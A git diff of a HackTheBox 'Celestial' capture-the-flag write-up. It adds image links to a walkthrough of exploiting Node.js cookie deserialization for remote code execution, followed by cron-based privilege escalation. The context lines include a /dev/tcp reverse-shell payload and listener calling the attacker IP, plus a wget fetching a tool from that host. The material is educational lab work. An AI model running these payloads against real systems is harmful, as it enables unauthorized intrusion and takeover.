@@ -1,5 +1,5 @@
 # Celestial [HTB](https://app.hackthebox.com/machines/130)
-![celestial-01]()
+![celestial-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/celestial-01.png)
 
 ## Recon
 
@@ -9,7 +9,7 @@ After adding an entry for our target in `/etc/hosts`, i start enumerating with `
 nmap -sC -sV -A -p- celestial.htb -oN nmap.result
 ``` 
 
-![nmap-res-02]()
+![nmap-res-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/nmap-res-02.png)
 
 We have a single `Node.js` web server running on port 3000, lets take a look at it.
 
@@ -18,17 +18,17 @@ We have a single `Node.js` web server running on port 3000, lets take a look at 
 
 Lets start by openning the site at `http://celestial.htb:3000`
 
-![site-03]()
+![site-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/site-03.png)
 
 Ok, not much to see here, lets open `Burp` and take a closer look at what's happenning in the background:
 
-![burp-04]()
+![burp-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/burp-04.png)
 
 When we make an initial request, Altough the server replied with a `200` OK HTTP status, it prints
 out a `404` text header. Along with that, the server gives us a cookie. If we then refresh the page, 
 our client requests the same root directory, but this time adds the cookie and now we get the page:
 
-![cookie-05]()
+![cookie-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/cookie-05.png)
 
 
 So the cookie is being used here for something. When I initially researched `Node.js` cookies, I found
@@ -40,16 +40,16 @@ us be the target. So this tool will not help us.
 Then i took a closer look at the cookie itself, at first i thought it was encrypted with a strong 
 encryption algorithm, but still I decided to check it againts [hash-identifier](https://hashes.com/en/tools/hash_identifier):
 
-![base64-06]()
+![base64-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/base64-06.png)
 
 If we take our cookie and [decode](https://www.base64decode.org/) it we see the following:
 
-![decode-07]()
+![decode-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/decode-07.png)
 
 So the cookie is just a base64 encoded JSON data. The `username` and `num` keys are interesting. 
 I think they are used to render the text on the main page. Lets set the `num` argument to `4` encode it and send it to the target:
 
-![num-08]()
+![num-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/encode-08.png)
 
 Now lets send that to the server as the cookie and see what happens:
 
@@ -57,7 +57,7 @@ Now lets send that to the server as the cookie and see what happens:
 curl -H 'Cookie: profile= eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjQifQo=' http://celestial.htb:3000
 ```
 
-![response-09]()
+![response-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/response-09.png)
 
 We can see the response has changed. We can conclude from this that the server is using data extracted
 from the cookie to render the web page. And since we can easily control what goes in the cookie, we can 
@@ -67,7 +67,7 @@ Now the question is, how we can levrage this to get access to the system?
 
 So i started to play around with different payloads, like `"num": "id"`. Which lead me to an interesting error:
 
-![eval-10]
+![eval-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/evaul-10.png)
 
 The `eval()` function in JavaScript evaluates and executes java code, this is a potential attack vector. 
 So i tried to to send a reverse shell with the different payloads. None worked for me, but the following one brought yet another interesting error:
@@ -76,7 +76,7 @@ So i tried to to send a reverse shell with the different payloads. None worked f
 "num":"exec(\"/bin/bash -c 'exec 5<>/dev/tcp/10.10.14.61/443;cat <&5 | while read line; do $line 2>&5 >&5; done'\");"
 ```
 
-![unserialize-11]()
+![unserialize-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/unserialize-11.png)
 
 
 While googeling this error, i came across an interesting [artical](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/). Apperantly, in some 
@@ -90,7 +90,7 @@ After downloading the script, i generated my payload with:
 ./nodejsshell.py 10.10.14.61 443
 ```
 
-![gen-payload-12]()
+![gen-payload-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/gen-payload-12.png)
 
 This results in a rather large output. I took the `<nums>` output and wrapped it inside a serliazed function and i invoked it at the end with `()`:
 
@@ -100,7 +100,7 @@ This results in a rather large output. I took the `<nums>` output and wrapped it
 
 I took the payload and placed it as the value for the `num` property in the cookie and base64 encoded it:
 
-![encode-13]()
+![encode-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/encode-13.png)
 
 
 I started my listener with:
@@ -111,11 +111,11 @@ rlwrap nc -lnvp 443
 
 And i sent the payload to the target:
 
-![send-14]()
+![send-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/send-14.png)
 
 This gave me access to the system:
 
-![shell-15]()
+![shell-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/shell-15.png)
 
 
 ## Privilege Escalation
@@ -126,7 +126,7 @@ The first thing i did after landing the shell was to upgrade it with:
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-![upgrade-shell-16]()
+![upgrade-shell-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/upgrade-shell-16.png)
 
 Now it's a bit more intuitive. Then i tried to snatch quick wins by running `history`, `sudo -l`, as well
 as `find / -perm -4000 2>/dev/null` but with no luck. 
@@ -136,7 +136,7 @@ If we take a look at our user's group membership with `id` we can see that our u
 So intead i decided to have a look around the system, if we list out the contents of our home folder we 
 will se somthing interesting:
 
-![home-dir-17]()
+![home-dir-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/home-folder-17.png)
 
 We have a text file in our home folder owned by root, this is unusual. I'm thinking that a task is 
 probably running in the background doing this. Lets get [pspy64](https://github.com/DominicBreuker/pspy)
@@ -155,7 +155,7 @@ wget http://10.10.14.61/pspy64
 chmod +x pspy64 
 ./pspy64
 ```
-![task-18]()
+![task-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/task-18.png)
 
 Here it is. We have root (UID 0), spwaining `bin/sh` to run a python script found in our user's `~/Documents` directory. The output from the script is saved to the `output.txt` file we saw erlier. 
 
@@ -184,6 +184,6 @@ rlwrap nc -lnvp 9001
 
 And waited for the connection:
 
-![root-19]()
+![root-19](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Celestial/img/root-19.png)
 
 
